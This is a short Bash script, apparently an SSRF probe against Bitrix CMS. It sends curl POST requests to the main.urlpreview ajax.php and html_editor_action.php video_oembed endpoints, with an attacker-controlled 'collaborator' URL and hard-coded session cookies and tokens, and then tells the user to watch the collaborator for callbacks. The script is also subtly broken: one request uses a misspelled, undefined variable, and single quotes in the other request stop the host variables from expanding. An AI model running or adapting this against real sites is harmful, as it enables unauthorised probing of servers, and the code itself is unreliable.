#!/bin/bash

# Проверяем, передан ли аргумент
if [ -z "$1" ]; then
  echo "Usage: $0 <target_host>"
  exit 1
fi

TARGET_HOST="$1"
COLLOBORATOR_HOST="$2"

echo -e "\n${TARGET_HOST}/bitrix/components/bitrix/main.urlpreview/ajax.php\n"

curl -X POST \
  "http://${TARGET_HOST}/bitrix/components/bitrix/main.urlpreview/ajax.php" \
  -H "Host: ${TARGET_HOST}" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Cookie: PHPSESSID=7urta3oi29betoag3g3h2jbg8m;' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'sessid=656db36ceb38d078d434594506a490d9' \
  --data-urlencode 'userFieldId=1' \
  --data-urlencode 'action=attachUrlPreview' \
  --data-urlencode "url=http://${COLLABORATOR_HOST}/"

echo -e "\n${TARGET_HOST}/bitrix/tools/html_editor_action.php\n"

curl -X POST \
  "http://${TARGET_HOST}/bitrix/tools/html_editor_action.php" \
  -H 'Host: ${TARGET_HOST}' \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Cookie: PHPSESSID=7urta3oi29betoag3g3h2jbg8m;' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'sessid=656db36ceb38d078d434594506a490d9' \
  --data-urlencode 'action=video_oembed' \
  --data-urlencode 'video_source=http://${COLLOBORATOR_HOST}/'

echo "[!] - Look at your colloborator"
